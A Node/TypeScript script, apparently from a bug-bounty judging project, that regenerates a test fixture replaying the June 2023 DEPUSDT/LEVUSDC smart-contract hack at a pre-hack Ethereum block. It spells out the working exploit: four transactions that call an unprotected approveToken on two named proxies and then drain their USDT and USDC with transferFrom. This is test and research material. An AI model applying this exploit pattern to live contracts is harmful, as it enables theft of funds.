#!/usr/bin/env node
// Regenerate the committed historical-hack replay job (ticket #28).
//
// Replays the DEPUSDT / LEVUSDC access-control hack of June 15, 2023 against Ethereum
// mainnet's real pre-hack state, so BounTEE's judge scores a real-world theft with no change
// (D11). The exploit is the one DeFiHackLabs reproduced (Apache-2.0,
// SunWeb3Sec/DeFiHackLabs src/test/2023-06/DEPUSDT_LEVUSDC_exp.sol): the vulnerable proxies
// expose `approveToken(token, spender, amount)` with no access control, so anyone can make a
// proxy approve them and drain its tokens with `transferFrom`.
//   - DEPUSDT proxy 0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f (holds USDT)
//   - LEVUSDC proxy 0x2a2b195558cF89AA617979ce28880BbF7e17bc45 (holds USDC)
//   - pre-hack block 17_484_161 (the DeFiHackLabs fork block; LEVUSDC's real drain came six
//     blocks later, so at this one block both proxies are still full).
//
// We replay it as four plain transactions from one FRESH account (no attacker contract, so
// every sender is provable-absent): approveToken + transferFrom for each proxy. State and
// proofs are read from a public archive RPC that serves `eth_getProof` at the historical
// block (reads only, never a transaction — the hack is three years past). The result is
// written to depusdt-levusdc.json and committed; the test replays it offline.
//
//   node cli/test/fixtures/historical/make-job.ts [--rpc <archive-url>] [--out <file>]
//
// Needs the judge wasm built: cargo build --release -p bountee-judge --target wasm32-wasip2.
import { writeFileSync, readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { keccak_256 } from "@noble/hashes/sha3.js";
import { parseExploit, parseRules, toJson } from "@bountee/formats";
import { collectReplay, rpc } from "../../../src/proofs.ts";

const repo = fileURLToPath(new URL("../../../../", import.meta.url));
const target = readFileSync(`${repo}judge/wasm-target`, "utf8").trim();
const WASM = `${repo}target/${target}/release/bountee-judge.wasm`;

const arg = (name: string, fallback: string) => {
  const i = process.argv.indexOf(`--${name}`);
  return i >= 0 && process.argv[i + 1] ? process.argv[i + 1]! : fallback;
};
const RPC = arg("rpc", "https://eth-mainnet.public.blastapi.io");
const OUT = arg("out", fileURLToPath(new URL("./depusdt-levusdc.json", import.meta.url)));

const BLOCK = 17_484_161;
const CHAIN_ID = 1;
const USDT = "0xdac17f958d2ee523a2206206994597c13d831ec7";
const USDC = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
const PROXY_DEPUSDT = "0x7b190a928aa76eece5cb3e0f6b3bdb24fcdd9b4f";
const PROXY_LEVUSDC = "0x2a2b195558cf89aa617979ce28880bbf7e17bc45";

// A fresh attacker with no known key: nothing signs this replay, and the judge needs only
// that the sender is absent from the block's state. Derived from a fixed label so the job is
// reproducible.
const utf8 = (s: string) => new TextEncoder().encode(s);
const attacker = `0x${Buffer.from(keccak_256(utf8("bountee:28:depusdt-levusdc:attacker"))).toString("hex").slice(24)}`;

const selector = (sig: string) => `0x${Buffer.from(keccak_256(utf8(sig))).toString("hex").slice(0, 8)}`;
const APPROVE_TOKEN = selector("approveToken(address,address,uint256)");
const TRANSFER_FROM = selector("transferFrom(address,address,uint256)");
const MAX_U256 = (1n << 256n) - 1n;
const word = (v: string | bigint) => BigInt(v).toString(16).padStart(64, "0");
const addrWord = (a: string) => a.replace(/^0x/, "").toLowerCase().padStart(64, "0");
const GAS = 30_000_000; // the block's gas limit: the most a tx may have (#9's gas fix)

async function callUint(to: string, data: string): Promise<bigint> {
  const hex = await rpc<string>(RPC, "eth_call", [{ to, data }, `0x${BLOCK.toString(16)}`]);
  return BigInt(hex);
}

async function main() {
  const balOf = (holder: string) => `0x70a08231${addrWord(holder)}`;
  const usdtHeld = await callUint(USDT, balOf(PROXY_DEPUSDT));
  const usdcHeld = await callUint(USDC, balOf(PROXY_LEVUSDC));
  console.error(`ProxyDEPUSDT holds ${usdtHeld} USDT, ProxyLEVUSDC holds ${usdcHeld} USDC at block ${BLOCK}`);
  if (usdtHeld === 0n || usdcHeld === 0n) throw new Error("a proxy is already empty at this block");

  const exploit = parseExploit({
    transactions: [
      // 1: no access control — make the DEPUSDT proxy approve the attacker over its USDT.
      { from: attacker, to: PROXY_DEPUSDT, value: "0", gas: GAS,
        input: `${APPROVE_TOKEN}${addrWord(USDT)}${addrWord(attacker)}${word(MAX_U256)}` },
      // 2: drain the proxy's USDT to the attacker.
      { from: attacker, to: USDT, value: "0", gas: GAS,
        input: `${TRANSFER_FROM}${addrWord(PROXY_DEPUSDT)}${addrWord(attacker)}${word(usdtHeld)}` },
      // 3: the same flaw on the LEVUSDC proxy, over its USDC.
      { from: attacker, to: PROXY_LEVUSDC, value: "0", gas: GAS,
        input: `${APPROVE_TOKEN}${addrWord(USDC)}${addrWord(attacker)}${word(MAX_U256)}` },
      // 4: drain the proxy's USDC to the attacker.
      { from: attacker, to: USDC, value: "0", gas: GAS,
        input: `${TRANSFER_FROM}${addrWord(PROXY_LEVUSDC)}${addrWord(attacker)}${word(usdcHeld)}` },
    ],
  });

  // USDT and USDC are ~$1 and both 6-decimal, so one value unit per smallest unit prices the
  // theft in micro-dollars; native ETH is listed at 0 (it is only the gas seed).
  const rules = parseRules({
    covered_contracts: [
      { chain_id: CHAIN_ID, address: PROXY_DEPUSDT },
      { chain_id: CHAIN_ID, address: PROXY_LEVUSDC },
    ],
    recency_limit_secs: 300,
    listed_tokens: [
      { chain_id: CHAIN_ID, token: USDT, price: "1" },
      { chain_id: CHAIN_ID, token: USDC, price: "1" },
      { chain_id: CHAIN_ID, token: "native", price: "0" },
    ],
    seed: { native: "1000000000000000000", tokens: [] },
    bounty_amount: "100000000",
    minimum_theft: "1000000000", // 1,000 USD-equivalent; the real theft is ~106,000.
    end_date_ns: "1796442141731000000",
    disclosure_delay_days: 30,
    exploit_public_key: "x25519:BvcnVkZZ98AyydmC32UrjcUUKA5YpUydb2v2jm76HBnB",
    judge_build_hash: "0xc4222111c3523dae3bd7b3002fb63ddf254231bd9f437c497acf4d5962a1df45",
  });

  const { replay, verdict } = await collectReplay({ rpc: RPC, chain: CHAIN_ID, block: BLOCK, rules, exploit, wasm: WASM });
  writeFileSync(OUT, `${toJson({ replay })}\n`);
  console.error(`wrote ${OUT}: ${replay.proofs.length} account proofs, verdict ${JSON.stringify(verdict)}`);
  if (verdict?.outcome !== "PAYS") throw new Error(`expected PAYS, got ${JSON.stringify(verdict)}`);
}

await main();
